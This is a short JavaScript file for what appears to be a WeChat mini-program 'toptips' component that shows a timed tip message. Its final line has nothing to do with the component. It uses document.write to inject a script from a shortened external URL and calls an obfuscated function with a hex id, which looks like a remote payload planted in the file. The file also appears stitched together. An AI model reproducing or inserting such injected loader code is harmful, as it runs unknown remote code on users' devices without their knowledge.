import Toptips from './toptips';

Component({
  externalClasses: ['custom-class'],
  options: {
    multipleSlots: true
  },

  properties: {},

  data: {
    duration: 3000,
    content: '提示内容',
    show: false
  },

  methods: {
    setMsg (options) {
      const newOptions = Object.assign({}, this.data, options)
      newOptions.show = true
      this.setData(newOptions)
      setTimeout(() => {
        this.setData({
          show: false
        })
      }, newOptions.duration)
    }
  }
})

const toptips = new Toptips()
export default toptips;
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
